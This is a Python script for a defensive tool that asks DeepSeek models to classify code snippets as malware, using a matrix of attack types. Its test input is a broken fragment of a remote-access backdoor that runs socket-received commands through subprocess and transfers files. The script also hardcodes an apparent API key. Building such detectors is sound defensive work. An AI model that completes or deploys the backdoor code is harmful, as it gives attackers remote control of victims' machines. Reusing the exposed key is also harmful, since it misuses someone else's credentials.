import os
from openai import OpenAI


ASSERTION_PROMPT = """
You are a supply chain security expert. Analyze the provided code snippet: {code_snippet}

Step 1: Determine the "Primary Malicious Intent" (e.g., Keylogger, Backdoor, Wiper, Ransomware, Cryptominer).
Step 2: Apply the "Success Criteria Matrix" below to determine if the attack is "Full" or "Core".

*** ATTACK TYPE SUCCESS CRITERIA MATRIX ***

[Type A: InfoStealer / Keylogger / Spyware]
- Goal: Steal sensitive data (env vars, passwords, keystrokes) and send it to the attacker.
- Core Attack Chain: Successfully collects/records data to a variable or local file, BUT lacks the network logic to exfiltrate it.
- Full Attack Chain: Collects data AND contains logic to exfiltrate it (via HTTP, SMTP, DNS, FTP, or Webhook).
  * Rule: No Network Exfiltration = NOT Full (for this type).

[Type B: Backdoor / RAT (Remote Access Trojan) / Reverse Shell]
- Goal: Provide unauthorized remote access or command execution.
- Core Attack Chain: Defines malicious functions (e.g., `os.popen`, `subprocess.run`) but lacks a trigger or connection mechanism.
- Full Attack Chain: 
  1. Has Execution Logic: Can run arbitrary commands.
  2. Has Connectivity: Connects to a C2 server (Reverse Shell) OR opens a listener (Bind Shell) OR fetches commands from a URL.
  3. Has Trigger/Concealment: Is inserted in a place that can execute (e.g., `__init__`, `setup.py`, or hooks a standard library).

[Type C: Ransomware]
- Goal: Deny access to data until payment.
- Core Attack Chain: Encrypts files but lacks a ransom note or decryption key management.
- Full Attack Chain: Encrypts files AND generates a ransom note/demand.

[Type D: Wiper / Logic Bomb]
- Goal: Destroy/Encrypt data or exhaust resources (Availability Loss).
- Core Attack Chain: Logic exists but is unreachable.
- Full Attack Chain: The destructive logic (delete, overwrite, flood) is present and executable. 

[Type E: Clipboard Hijacker / Clipper] 
- Goal: INTERCEPT and MODIFY user clipboard content (specifically crypto addresses) to redirect funds.
- Key Characteristics: Uses Regex to find wallet addresses and replaces them (`Set-Clipboard` or similar).
- Core Attack Chain: Identifies targets but fails to execute the replacement/swap logic.
- Full Attack Chain: 
  1. Monitoring Logic: Can read clipboard content.
  2. Targeting Logic: Contains Regex for specific assets (BTC, ETH, etc.).
  3. Action Logic: Successfully replaces/overwrites the clipboard content with a hardcoded address.

[Type F: Uncategorized High-Impact Threat]
- Definition: Any malicious logic that does not fit A-F but causes **Severe Harm** to the Confidentiality, Integrity, or Availability of the system.
- Scope of Severe Harm:
  1. **Integrity Loss:** Modifying system settings (e.g., DNS, Hosts file, Firewall rules), disabling security tools (AV/EDR), or injecting code into other processes.
  2. **Confidentiality Loss (Novel methods):** Exposing internal state/secrets to public logs, or side-channel attacks not covered by Type A.
  3. **Availability Loss (Novel methods):** Killing critical system processes, infinite fork bombs, or physical hardware stress.
  4. **Facilitation:** Dropping/Downloading unknown binaries (Droppers) or obfuscated execution (Loaders).
- Full Attack Chain: The harmful action is fully implemented and executable. The code successfully performs the harmful modification, download, or exposure.
- Core Attack Chain: The harmful logic is present but unreachable or incomplete.


*** CLASSIFICATION FRAMEWORK ***

Based on the Matrix above, classify the code:

1. Full Attack Chain: Meets ALL criteria for its specific Attack Type in the Matrix. The objective is strategically complete.
2. Core Attack Chain: Meets the "Core" criteria in the Matrix. The capability exists locally or partially but fails to close the loop (e.g., Keylogger without Email, Ransomware without Note).
3. Fragmented Attack Chain: Isolated suspicious snippets (e.g., just a base64 string, just a random import) without logic flow.
4. Benign Artifact: Legitimate, explainable code.

Provide structured response:
- **Malware Type:** (e.g., "Keylogger", "Wiper", "Backdoor")
- **Classification:** "Full Attack Chain" | "Core Attack Chain" | ...
- **Missing Components:** Critical missing steps based on the Matrix (e.g., "Missing Network Exfiltration module").
- **Potential Impact:** Description of consequences.
- **Threat Level:** High/Medium/Low.
"""

CHECK_PROMPT = """Analyze the previous classification response's Missing Components part. 
                If the inability to reach the next level is solely caused by non-logical issues such as syntax errors, missing imports, missing error handling, placeholder or fake IP addresses, minor formatting/encoding problems, or other superficial implementation faults, 
                ignore those issues and re-evaluate the code as if they were fixed. 
                
                Produce a structured English response with these fields:
                - Malware Type: (e.g., "Keylogger", "Wiper", "Backdoor")
                - Classification: "Full Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact"
                - Missing Components: If classified as "Core" or "Fragmented", list the specific logical capabilities missing to reach the next level. Ignore superficial blockers described above.
                - Potential Impact: Describe consequences if the attack were fully realized.
                - Threat Level: High/Medium/Low based on the logical capabilities present after ignoring superficial faults.

                Return only the structured response in plain English using the field names above."""
SYSTEM_PROMPT = """You are a professional cybersecurity analyst tasked with analyzing code snippets from victim's perspective to classify given code snippets."""
    
        #Also ignore persistence mechanisms (e.g., file-based persistence, registry entries, scheduled tasks, or other long-term storage/auto-start mechanisms) when determining whether the attack reaches the next level. 
class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content



    def reset_conversation(self, system_prompt=None):
        """清空会话历史，可选设置新的 system_prompt"""
        self.conversation_history = []
        if system_prompt:
            self.conversation_history.append({"role": "system", "content": system_prompt})

    def get_conversation_history(self):
        """返回当前会话历史的浅拷贝"""
        return list(getattr(self, "conversation_history", []))
    
    
    def malicious_assertion_check(self):
        self.conversation_history.append({"role": "user", "content": CHECK_PROMPT})
        
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        return completion.choices[0].message.content
    
    def malicious_assertion(self, code_snippet):
        user_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        self.conversation_history.append({"role": "system", "content": SYSTEM_PROMPT})
        self.conversation_history.append({"role": "user", "content": user_prompt})
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        self.conversation_history.append({"role": "assistant", "content": completion.choices[0].message.content})
        return completion.choices[0].message.content
    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)
